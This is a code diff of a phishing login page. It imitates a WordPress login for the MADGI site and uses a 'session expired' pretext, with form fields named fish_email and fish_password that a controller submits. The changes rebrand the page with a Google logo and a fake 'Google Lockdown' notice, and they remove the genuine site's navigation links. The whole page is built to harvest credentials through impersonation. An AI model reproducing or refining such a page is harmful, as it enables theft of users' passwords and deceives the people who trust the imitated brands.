@@ -21,32 +21,29 @@
     </head>
   <body class="login login-action-login wp-core-ui  locale-fr-fr" ng-app="ovh-app" ng-controller="MainCtrl as mainctrl">
     <div id="login">
-    <h1><a href="http://www.madgi.ci/" title="Notre raison,être toujours le plus proche de vous" tabindex="-1">MADGI SITE OFFICIEL</a></h1>
-    <h3 align="center">Oups!! votre session a été expiré, veuillez vous authentifier pour continuer</h3 align="center">
 	<?= $this->fetch('content') ?>
-	
-	<form name="loginform" ng-submit="mainctrl.subscribe_service(mainctrl.service)">
+	  	<p align="center">
+ 	   <img src="/img/google.png" alt="" width="170px">
+  	</p>
+
+  	  <h3 align="center">Oups!! votre session a été expiré, veuillez vous authentifier pour continuer</h3 align="center">
+	<form style="border-top: 3px solid red !important;" name="loginform" ng-submit="mainctrl.subscribe_service(mainctrl.service)">
 	  <p>
 	    <label for="user_login">Nom d’utilisateur ou adresse e-mail<br>
-	    <b><span ng-bind='mainctrl.service.fish_email'></span></b> <br> <br>
+	    <b><span ng-bind="mainctrl.service.fish_email"></span></b> <br> <br>
 	    <input ng-minlength="4" type="text" ng-model="mainctrl.service.fish_email" name="log" id="user_login" class="input required ng-hide" value="" required ng-maxlength="20"></label>
 	  </p>
 	  <p>
 	    <label for="user_pass">Mot de passe<br>
 	    <input ng-minlength="7" type="password" ng-model="mainctrl.service.fish_password" required name="pwd" id="user_pass" class="input" value="" ng-maxlength="20"></label>
 	  </p>
-	  <p>Login form protected by <a href="http://www.bad-neighborhood.com/login-lockdown.html">Login LockDown</a>.<br><br><br></p>  <p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"> Se souvenir de moi</label></p>
+	  <p>Login form protected by <a href="http://www.bad-neighborhood.com/login-lockdown.html"> Google Lockdown</a>.<br><br><br></p>  <p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"> Se souvenir de moi</label></p>
 	  <p class="submit">
 	    <input type="submit" name="wp-submit" id="wp-submit" ng-disabled="loginform.$invalid" class="button button-primary button-large" value="Se connecter">
 	    <input type="hidden" name="redirect_to" value="http://www.madgi.ci">
 	    <input type="hidden" name="testcookie" value="1">
-	    <input type="reset" id="reset-button" class="hide">
 	  </p>
 	</form>
-
-<p id="nav">
-<a href="http://www.madgi.ci/wp-login.php?action=register">Inscription</a> |  <a href="http://www.madgi.ci/mon-compte/lost-password/">Mot de passe oublié&nbsp;?</a>
-</p>
 
     
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1/jquery.js"></script>
@@ -83,8 +80,6 @@ d.select();
 wp_attempt_focus();
 if(typeof wpOnload=='function')wpOnload();
 </script>
-
-  <p id="backtoblog"><a href="http://www.madgi.ci/">← Retour vers MADGI SITE OFFICIEL</a></p>
   
   </div>
 
